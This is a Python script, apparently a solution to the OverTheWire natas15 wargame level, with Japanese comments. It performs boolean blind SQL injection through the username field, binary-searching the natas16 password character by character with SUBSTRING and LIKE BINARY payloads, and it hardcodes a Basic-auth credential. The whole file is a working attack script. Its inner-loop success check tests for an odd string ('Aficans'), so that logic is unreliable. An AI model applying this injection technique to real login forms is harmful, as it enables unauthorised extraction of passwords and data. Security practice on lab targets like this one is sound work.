import requests

# 接続先URL
url = "http://natas15.natas.labs.overthewire.org/"

# Basic認証が必要な場合の指定方法（ユーザー名, パスワード）
auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

# 候補文字列
cand = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
cand = sorted(cand)

# print(cand)

epoch = 0
decided = ""
while True:
    password = decided + "_%"
    username = f'natas16" and password like binary "{password}'
    data = {"username": username}
    response = requests.post(url, data=data, auth=auth)
    if not "This user exists." in response.text:
        print("password: " + decided)
        break

    ac, wa = 0, len(cand)
    while wa - ac > 1:
        wj = (ac + wa) // 2
        password = decided + cand[wj] + "%"
        epoch += 1
        print("epoch: " + str(epoch) + ", password: " + password)
        # 
        username = f'natas16" and binary SUBSTRING(password, {len(decided)+1}, 1) >= "{cand[wj]}'
        data = {"username": username}
        # リクエストの実行
        response = requests.post(url, data=data, auth=auth)

        if "Aficans" in response.text:
            ac = wj
        else:
            wa = wj

    decided += cand[ac]
